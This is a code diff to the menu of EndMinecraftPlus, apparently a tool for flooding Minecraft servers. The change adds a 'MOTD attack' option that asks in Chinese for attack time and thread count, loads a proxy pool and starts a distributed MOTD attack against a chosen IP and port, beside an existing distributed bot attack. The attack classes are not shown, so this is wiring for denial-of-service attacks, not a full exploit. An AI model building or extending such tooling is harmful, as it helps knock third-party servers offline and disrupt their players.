@@ -4,7 +4,6 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Scanner;
@@ -12,6 +11,7 @@ import java.util.Scanner;
 import luohuayu.EndMinecraftPlus.Utils;
 import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
 import luohuayu.EndMinecraftPlus.tasks.attack.DistributedBotAttack;
+import luohuayu.EndMinecraftPlus.tasks.attack.DistributedMotdAttack;
 import luohuayu.EndMinecraftPlus.tasks.attack.IAttack;
 import luohuayu.EndMinecraftPlus.tasks.attack.MotdAttack;
 import luohuayu.MCForgeProtocol.MCForge;
@@ -57,6 +57,17 @@ public class Menu extends Utils {
         Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
         log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
         IAttack attack = new DistributedBotAttack(time, maxAttack, sleepTime, lele, tab, modList);
+        attack.start(ip, port);
+    }
+
+    public void _3() {
+        log("MOTD攻击选择");
+        log("请输入攻击时间(单位：蛤)(60)");
+        int time = getCo(scanner.nextLine(), 60);
+        log("请输入线程数(10)");
+        int thread = getCo(scanner.nextLine(), 16);
+        getProxy();
+        IAttack attack = new DistributedMotdAttack(time, thread, 0, false, false, null);
         attack.start(ip, port);
     }
 
